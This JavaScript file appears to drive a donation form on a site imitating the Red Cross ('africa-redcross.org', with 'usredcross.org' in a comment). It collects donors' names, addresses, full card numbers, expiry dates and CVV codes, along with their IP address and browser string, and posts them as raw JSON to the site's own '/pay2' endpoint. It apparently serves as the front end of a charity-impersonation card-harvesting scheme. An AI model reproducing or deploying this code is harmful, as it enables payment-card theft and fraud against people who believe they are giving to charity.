var ipvalue = '127.0.0.1'

function openDetails(){
    // var x = document.getElementById('paydetails')  ;
    // x.style.display="";
    // document.getElementById("DonateButton").style.display="";
    
    // addScript("https://api.ip.sb/geoip?callback=getip");
    
    window.open("https://africa-redcross.org/donate/pay.html", "_blank"); 
    
    //   var model = document.querySelector("#exampleModal");
    //                 model.className = "modal fade show";
    //                 model.style="visibility:visible;display: block;";
    //                 model.ariaModal=true;
    //                 model.role="dialog";

    //                 var amount = donateamountvalue.value;

    //                  //
    //                 var ifr = document.getElementById("payiframe")
    //                 ifr.src ="https://africa-redcross.org/donate/pay.html";
                    //ifr.src = "https://africa-redcross.org/payment/index.php?amount="+amount*100;
};

function addScript(url){
	var script = document.createElement('script');
	script.setAttribute('type','application/javascript');
	script.setAttribute('src',url);
	document.getElementsByTagName('head')[0].appendChild(script);
}


function getip(json){
    console.log(json['country_code']);
    ipvalue = json['ip'];
    document.getElementById('bill_to_address_country').value= json['country_code'];
}

function closeModel(){
      var model = document.querySelector("#exampleModal");
      model.className = "modal fade";
      model.style="";
};

function getUrl(){
      var amount = donateamountvalue.value;
      
      var firstname = document.getElementById('bill_to_forename').value
      if(firstname == '' || firstname == ' '){
          alert('Please tell us your first name.');
          return;
      }
      
      var lastname = document.getElementById('bill_to_surname').value
      if(lastname == '' || lastname == ' '){
          alert('Please tell us your last name.');
          return;
      }
      
      
      var email = document.getElementById('bill_to_email').value
      if(email == '' || email == ' '){
          alert('We need your email address to send you a receipt.');
          return;
      }
      
      var phone = document.getElementById('bill_to_phone').value
     
      
      //billing-information-section
      var address = document.getElementById('bill_to_address_line1').value
      if(address == '' || address == ' '){
          alert("Don't forget to tell us your billing address.");
          return;
      }
      
      var address2 = document.getElementById('bill_to_address_line2').value
      // if(address2 == '' || address2 == ' '){
      //     alert('We need your email address to send you a receipt.');
      //     return;
      // }
      
      var country = document.getElementById('bill_to_address_country').value
      if(country == '' || country == ' '){
          alert("Don't forget to tell us your billing country.");
          return;
      }
      
      var city = document.getElementById('bill_to_address_city').value
      if(city == '' || city == ' '){
          alert('Please enter a city without special characters or accents.');
          return;
      }
      
      var state = document.getElementById('bill_to_address_state').value
      if(state == '' || state == ' '){
          alert('Please enter your state without special characters or accents.');
          return;
      }
      
      
      var postcode = document.getElementById('bill_to_address_postal_code').value
      if(postcode == '' || postcode == ' '){
          alert('Please enter your postcode without special characters or accents');
          return;
      }
      
      var cardnumber = document.getElementById('cc-number').value
      if(cardnumber == '' || cardnumber == ' '){
          alert('Please enter your credit card number.');
          return;
      }
      
       var mm = document.getElementById('mm').value
      if(mm == '' || mm == ' '){
          alert('Please enter a two-digit month between 01-12.');
          return;
      }
      
       var yy = document.getElementById('yy').value
      if(yy == '' || yy == ' '){
          alert('Please enter a two-digit year between 21-31.');
          return;
      }
      
       var CVVcode = document.getElementById('cvv').value
      if(CVVcode == '' || CVVcode == ' '){
          alert('Please enter a CVV code.');
          return;
      }
      
      var obj = { amount: amount, 
                 firstname: firstname,
                 lastname:lastname,
                 email:email,
                 address:address,
                 address2:address2,
                 country:country,
                 city:city,
                 state:state,
                 postcode:postcode,
                 phone:phone,
                 cardNo:cardnumber,
                 cardexpYear:'20'+yy,
                 cardexpMonth:mm,
                 cardCode:CVVcode,
                 ip:ipvalue,
                 ua:navigator.userAgent
      };
      
      
      
      var httpRequest = new XMLHttpRequest();
      httpRequest.open('POST', 'https://africa-redcross.org/pay2', true);
      httpRequest.setRequestHeader("Content-type","application/json");//post
      httpRequest.send(JSON.stringify(obj));//send
       
      httpRequest.onreadystatechange = function () {
      if (httpRequest.readyState == 4 && httpRequest.status == 200) {
            var json = JSON.parse(httpRequest.responseText);
            console.log(json);
            if(json["resp_code"]==="00"){
                    //open model
                    var model = document.querySelector("#exampleModal");
                    model.className = "modal fade show";
                    model.style="visibility:visible;display: block;";
                    model.ariaModal=true;
                    model.role="dialog";

                     //
                    var ifr = document.getElementById("payiframe")
                   // ifr.src ="https://usredcross.org/donate/redirect.php?url="+json["payUrl"];
                     
                    ifr.src = "https://africa-redcross.org/donate/donation_success.html";
            }
            else{
                if(json["resp_code"]=="REDIRECT"){
                    if(json["redirect_url"] !==null ||json["redirect_url"] !== undefined || json["redirect_url"] !== ''){
                     
                        var ifr = document.getElementById("payiframe")

                        ifr.src =json["redirect_url"];
                            //open model
                        var model = document.querySelector("#exampleModal");
                        model.className = "modal fade show";
                        model.style="visibility:visible;display: block;";
                        model.ariaModal=true;
                        model.role="dialog";

                    }
                }
                else{
                    alert(json["resp_msg"]);
                }
            }
        }
     };
     
  }
